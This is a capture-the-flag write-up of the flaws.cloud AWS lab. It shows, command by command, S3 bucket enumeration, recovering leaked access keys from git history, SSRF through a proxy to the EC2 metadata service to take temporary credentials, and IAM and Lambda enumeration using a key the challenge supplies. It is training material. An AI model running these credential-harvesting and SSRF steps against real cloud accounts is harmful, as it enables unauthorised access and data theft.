# Flaws I

Link to Challenge: [flaws.cloud](http://flaws.cloud)  
Credits: [@0xdabbad00](https://twitter.com/0xdabbad00)

## Level 1 - Enumerating public S3 buckets (Unauthenticated)

!!!help "Objective"
    This level is *buckets* of fun. See if you can find the first sub-domain.

Our first task is to perform some enumeration round the domain itself:

```
fog@cloudbreach:~/flaws/level6$ dig flaws.cloud A +noall +answer
flaws.cloud.		5	IN	A	52.92.180.235
flaws.cloud.		5	IN	A	52.92.211.59
flaws.cloud.		5	IN	A	52.92.212.59
flaws.cloud.		5	IN	A	52.218.137.66
flaws.cloud.		5	IN	A	52.218.177.90
flaws.cloud.		5	IN	A	52.218.183.171
flaws.cloud.		5	IN	A	52.218.224.91
flaws.cloud.		5	IN	A	52.218.230.2
```

```
fog@cloudbreach:~/flaws/level6$ nslookup 52.92.180.235
235.180.92.52.in-addr.arpa	name = s3-website-us-west-2.amazonaws.com.
```

With this, we can infer that `flaws.cloud` is a static website hosted from a S3 bucket and that it is hosted on the `us-west-2` region.

```
fog@cloudbreach:~/flaws/level1$ aws s3 ls s3://flaws.cloud --region us-west-2
2017-03-13 23:00:38       2575 hint1.html
2017-03-02 23:05:17       1707 hint2.html
2017-03-02 23:05:11       1101 hint3.html
2020-05-22 14:16:45       3162 index.html
2018-07-10 12:47:16      15979 logo.png
2017-02-26 20:59:28         46 robots.txt
2017-02-26 20:59:30       1051 secret-dd02c7c.html
```

An alternative way (automated) to look for \*\*any\*\* open S3 bucket using the [`cloud_enum`](https://github.com/initstring/cloud_enum) tool would look like this:

```
python3 cloud_enum.py -k flaws.cloud -t 10 --disable-azure --disable-gcp -l cloud_enum_output.txt

++++++++++++++++++++++++++
      amazon checks
++++++++++++++++++++++++++

[+] Checking for S3 buckets
  OPEN S3 BUCKET: http://flaws.cloud.s3.amazonaws.com/
      FILES:
      ->http://flaws.cloud.s3.amazonaws.com/flaws.cloud
      ->http://flaws.cloud.s3.amazonaws.com/hint1.html
      ->http://flaws.cloud.s3.amazonaws.com/hint2.html
      ->http://flaws.cloud.s3.amazonaws.com/hint3.html
      ->http://flaws.cloud.s3.amazonaws.com/index.html
      ->http://flaws.cloud.s3.amazonaws.com/logo.png
      ->http://flaws.cloud.s3.amazonaws.com/robots.txt
      ->http://flaws.cloud.s3.amazonaws.com/secret-dd02c7c.html
                            
 Elapsed time: 00:02:56
```

The scanner tells us there is an unprotected open S3 bucket pointing over at [flaws.cloud.s3.amazonaws.com](http://flaws.cloud.s3.amazonaws.com)

We can list and dump its content using another tool called [`s3scanner`](https://github.com/sa7mon/S3Scanner) (not necessary, just for example's sake):

```
s3scanner --threads 10 dump --dump-dir . --bucket flaws.cloud.s3.amazonaws.com

fog@cloudbreach:~/flaws/level1$ ll flaws.cloud.s3.amazonaws.com/
total 48
drwxrwxr-x 2 fog fog  4096 Dec 12 23:05 ./
drwxrwxr-x 3 fog fog  4096 Dec 12 23:05 ../
-rw-rw-r-- 1 fog fog  2575 Dec 12 22:52 hint1.html
-rw-rw-r-- 1 fog fog  1707 Dec 12 22:52 hint2.html
-rw-rw-r-- 1 fog fog  1101 Dec 12 22:52 hint3.html
-rw-rw-r-- 1 fog fog  3162 Dec 12 22:52 index.html
-rw-rw-r-- 1 fog fog 15979 Dec 12 22:52 logo.png
-rw-rw-r-- 1 fog fog    46 Dec 12 22:52 robots.txt
-rw-rw-r-- 1 fog fog  1051 Dec 12 22:52 secret-dd02c7c.html
```

The flag for the next level can be accessed by visiting `secret-dd02c7c.html`.

![](/images/aws/training_labs/flaws_1_level1.png)

---

## Level 2 - Enumerating public S3 buckets (AWS users)

!!!help "Objective"
    The next level is fairly similar, with a slight twist. You're going to need your own AWS account for this. You just need the free tier.

This time we will use `aws cli` to solve the challenge. The only difference with the previous level is that we will need valid AWS access keys to be able to list and download the contents of the S3 bucket.  

Profiles can be added to your local machine using `aws configure`.

```
fog@cloudbreach:~/flaws/level2$ aws s3 ls level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud --profile=<aws_profile>
2017-02-26 21:02:15      80751 everyone.png
2017-03-02 22:47:17       1433 hint1.html
2017-02-26 21:04:39       1035 hint2.html
2017-02-26 21:02:14       2786 index.html
2017-02-26 21:02:14         26 robots.txt
2017-02-26 21:02:15       1051 secret-e4443fc.html
```

From there we can try to download the contents of the bucket using `aws s3 sync`:

```
fog@cloudbreach:~/flaws/level2$ aws s3 sync s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud . --profile=<aws_profile>
```

![](/images/aws/training_labs/flaws_1_level2.png)

---

## Level 3 - Hunting Keys in .Git Repository

```
fog@cloudbreach:~/flaws/level3$ git log master
commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (master)
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:43 2017 -0600

    Oops, accidentally added something I shouldn't have

commit f52ec03b227ea6094b04e43f475fb0126edb5a61 (HEAD)
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:07 2017 -0600

    first commit
```

Sometimes, developpers mess up by committing sensitive information like **passwords** or **API keys**. While they might rectify their mistake right away, all previous versions of the repository are stored in `.git/` and identified with a **commit hash**.

To find out what `scott@summitroute.com` committed to the repository, we just need to use the `git checkout` command.

``` 
fog@cloudbreach:~/flaws/level3$ git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61
M	index.html
Note: switching to 'f52ec03b227ea6094b04e43f475fb0126edb5a61'.

fog@cloudbreach:~/flaws/level3$ ll
total 168
drwxrwxr-x 3 fog fog   4096 Dec 13 01:16 ./
drwxrwxr-x 6 fog fog   4096 Dec 13 00:51 ../
-rw-rw-r-- 1 fog fog     91 Dec 13 01:16 access_keys.txt    <-- !!!
drwxrwxr-x 7 fog fog   4096 Dec 13 01:16 .git/
-rw-rw-r-- 1 fog fog   1552 Dec  8 02:44 hint1.html
-rw-rw-r-- 1 fog fog   1426 Dec  8 02:44 hint2.html
-rw-rw-r-- 1 fog fog   1247 Dec  8 02:44 hint3.html
-rw-rw-r-- 1 fog fog   1035 Dec  8 02:44 hint4.html
-rw-rw-r-- 1 fog fog   1861 Dec  8 02:44 index.html
-rw-rw-r-- 1 fog fog     26 Dec  8 02:44 robots.txt

```

Of course, in this example we are playing with a very scarce `.git/` repo. In practice, we could leverage tools like [`trufflehog`](https://github.com/trufflesecurity/trufflehog) to help us find interesting data (also [see](/aws/enumeration/#search-for-secrets-in-s3-buckets))

```
fog@cloudbreach:~/flaws/level3$ cat trufflehog_output.txt 
trufflehog dev
Found verified result 🐷🔑
Detector Type: AWS
Decoder Type: PLAIN
Raw result: AKIAJ366LIPB4IJKT7SA
Commit: f52ec03b227ea6094b04e43f475fb0126edb5a61
File: access_keys.txt
Email: 0xdabbad00 <scott@summitroute.com>
Timestamp: 2017-09-17 09:10:07 -0600 -0600
Line: 1
```

Now that we got our hands on a set of **AWS Access Keys** we can import them in our environment using `aws configure` and see what can be done with them.

```
fog@cloudbreach:~/flaws/level3$ aws configure list --profile level3
      Name                    Value             Type    Location
      ----                    -----             ----    --------
   profile                   level3           manual    --profile
access_key     ****************T7SA shared-credentials-file    
secret_key     ****************3Jys shared-credentials-file    
    region                us-west-2      config-file    ~/.aws/config
```

One of the first commands to run when looting AWS keys is `get-caller-identity` (AWS's version of `whoami`).

```
fog@cloudbreach:~/flaws/level3$ aws sts get-caller-identity --profile level3
{
    "UserId": "AIDAJQ3H5DC3LEG2BKSLC",
    "Account": "975426262029",
    "Arn": "arn:aws:iam::975426262029:user/backup"
}
```

Our user is called `backup`. We can leverage the policies attached to this account to list down all buckets visible by this user.

```
fog@cloudbreach:~/flaws/level3$ aws s3 ls --profile=level3
2020-06-25 13:43:56 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
2020-06-26 19:06:07 config-bucket-975426262029
2020-06-27 06:46:15 flaws-logs
2020-06-27 06:46:15 flaws.cloud
2020-06-27 11:27:14 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
2020-06-27 11:27:14 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
2020-06-27 11:27:14 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
2020-06-27 11:27:15 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
2020-06-27 11:27:15 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
2020-06-27 22:29:47 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
```

We don't have read access to everything, but enough to move on to the next level `level4-1156739cfb264ced6de514971a4bef68.flaws.cloud`.

!!!tip 
    Read the following from Github Docs: [Removing sensitive data from a repository](https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/removing-sensitive-data-from-a-repository#fully-removing-the-data-from-github)  
    NB: **always** rotate your keys/secrets if you suspect any potential leak.

![](/images/aws/training_labs/flaws_1_level4.png)

---

## Level 4 - Enumerating EC2 Instance

> For the next level, you need to get access to the web page running on an EC2 at 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud.  
> It'll be useful to know that a snapshot was made of that EC2 shortly after nginx was setup on it. 



---

## Level 5 - SSRF on AWS Metadata Service

!!!help "Objective"

    This EC2 has a simple HTTP only proxy on it. Here are some examples of it's usage:
    ```
    http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/
    http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml
    http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/ 
    ```
    See if you can use this proxy to figure out how to list the contents of the level6 bucket at `level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud` that has a hidden directory in it. 

By leveraging the proxy on the target EC2, we are able to force the server to issue a request to host under our control. This is more-or-less equivalent to a server-side-request-forgery (SSRF) attack.

SSRFs are known to be particularly impactful in cloud environments due to the presence of the internal metadata service (IMDS) running by default on every compute instance (AWS, GCP, Azure, etc.).

This service is generally accessible at a fixed IP address `169.254.169.254`, let's verify that:

```
fog@cloudbreach:~/flaws/level5$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/hostname
ip-172-31-41-84.us-west-2.compute.internal
```

Most importantly, the IMDS service sometimes allows access to sensitive access keys.

```
fog@cloudbreach:~/flaws/level5$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws
{
  "Code" : "Success",
  "LastUpdated" : "2022-12-13T07:20:49Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA**************XQ",
  "SecretAccessKey" : "gH5H********************************rjmy",
  "Token" : "IQoJ*****************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************4tuGdtSdxNiGtGsfPrY",
  "Expiration" : "2022-12-13T13:22:40Z"
}
```

We just need to create another profile and import the stolen keys in our environment to see if can do anything with them.


!!!warning
    [Temporary (AWS STS) access key IDs](https://docs.aws.amazon.com/STS/latest/APIReference/API_Credentials.html) - as denoted by the `ASIA` prefix in the `AccessKeyId` field - require to add an extra field in the `aws profile` configuration file:
        ```
        # cat ~/.aws/credentials
        [level6]
        aws_access_key_id = <AccessKeyId>
        aws_secret_access_key = <SecretAccessKey> 
        aws_session_token = <Token>
        ```
    
```
fog@cloudbreach:~/flaws/level6$ aws s3 sync s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ . --profile level6
fog@cloudbreach:~/flaws/level6$ ll
total 16
drwxrwxr-x 3 fog fog 4096 Dec  8 22:10 ./
drwxrwxr-x 8 fog fog 4096 Dec 13 03:18 ../
drwxrwxr-x 2 fog fog 4096 Dec  8 22:10 ddcc78ff/
-rw-rw-r-- 1 fog fog  871 Feb 26  2017 index.html
```

![](/images/aws/training_labs/flaws_1_level6.png)

---

## Level 6 - Exploiting AWS Lambda Functions

!!!help "Objective" 
    For this final challenge, you're getting a user access key that has the **SecurityAudit** policy attached to it. See what else it can do and what else you might find in this AWS account.

    ```
    Access key ID: AKIAJFQ6E7BY57Q3OBGA
    Secret: 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
    ```

Let's enumerate information about our current user. First question we ask ourselves is whether we have any kind of inline policies associated to us:

```
fog@cloudbreach:~/flaws/level6$ aws iam list-user-policies --user-name Level6 --profile level6
{
    "PolicyNames": []
}
```

What about attached policies?

```
fog@cloudbreach:~/flaws/level6$ aws iam list-attached-user-policies --user-name Level6 --profile level6
{
    "AttachedPolicies": [
        {
            "PolicyName": "MySecurityAudit",
            "PolicyArn": "arn:aws:iam::975426262029:policy/MySecurityAudit"
        },
        {
            "PolicyName": "list_apigateways",
            "PolicyArn": "arn:aws:iam::975426262029:policy/list_apigateways"
        }
    ]
}
```
As suggested by the level description, we do have an attached policy called `MySecurityAudit` but also `list_apigateways`.

What can we do with those?

!!!tip
    To retrieve a **managed policy** document that is attached to a user, use `GetPolicy` to determine the policy's default version. Then use `GetPolicyVersion` to retrieve the policy document.
    ```
    aws iam get_policy --policy-arn <policy_arn>     
    aws iam get_policy_version --policy-arn <policy_arn> --policy-id <policy_version>
    ```
    [https://docs.aws.amazon.com/cli/latest/reference/iam/get-user-policy.html#description](https://docs.aws.amazon.com/cli/latest/reference/iam/get-user-policy.html#description)


```
fog@cloudbreach:~/flaws/level6$ aws iam get-policy --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --profile level6
{
    "Policy": {
        "PolicyName": "list_apigateways",
        "PolicyId": "ANPAIRLWTQMGKCSPGTAIO",
        "Arn": "arn:aws:iam::975426262029:policy/list_apigateways",
        "Path": "/",
        "DefaultVersionId": "v4",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "List apigateways",
        "CreateDate": "2017-02-20T01:45:17Z",
        "UpdateDate": "2017-02-20T01:48:17Z",
        "Tags": []
    }
}
```

```
fog@cloudbreach:~/flaws/level6$ aws iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4 --profile level6
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Action": [
                        "apigateway:GET"
                    ],
                    "Effect": "Allow",
                    "Resource": "arn:aws:apigateway:us-west-2::/restapis/*"
                }
            ]
        },
        "VersionId": "v4",
        "IsDefaultVersion": true,
        "CreateDate": "2017-02-20T01:48:17Z"
    }
}
```

!!!tip
      Lambda functions are called using a combination of:  

      * `rest-api-id` -> e.g: s33ppypa75
      * `stage-name`  -> e.g: Prod
      * `region`      -> e.g: us-west-2
      * and `resource`-> e.g: level6

      Functions call be triggered by visiting URLs formed as: `https://<rest-api-id>.execute-api.<region>.amazonaws.com/<stage-name>/<resource>`


```
fog@cloudbreach:~/flaws/level6$ aws lambda get-policy --function-name Level6 --profile flaws-level6 --region us-west-2
{
    "Policy": "{\"Version\":\"2012-10-17\",\"Id\":\"default\",\"Statement\":[{\"Sid\":\"904610a93f593b76ad66ed6ed82c0a8b\",\"Effect\":\"Allow\",\"Principal\":{\"Service\":\"apigateway.amazonaws.com\"},\"Action\":\"lambda:InvokeFunction\",\"Resource\":\"arn:aws:lambda:us-west-2:975426262029:function:Level6\",\"Condition\":{\"ArnLike\":{\"AWS:SourceArn\":\"arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\"}}}]}",
    "RevisionId": "98033dfd-defa-41a8-b820-1f20add9c77b"
}
```

```
fog@cloudbreach:~/flaws/level6$ aws apigateway get-stages --rest-api-id s33ppypa75 --profile level6 --region us-west-2
{
    "item": [
        {
            "deploymentId": "8gppiv",
            "stageName": "Prod",
            "cacheClusterEnabled": false,
            "cacheClusterStatus": "NOT_AVAILABLE",
            "methodSettings": {},
            "tracingEnabled": false,
            "createdDate": 1488155168,
            "lastUpdatedDate": 1488155168
        }
    ]
}
```
[https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6](https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6)

![](/images/aws/training_labs/flaws_1_levelend.png)

---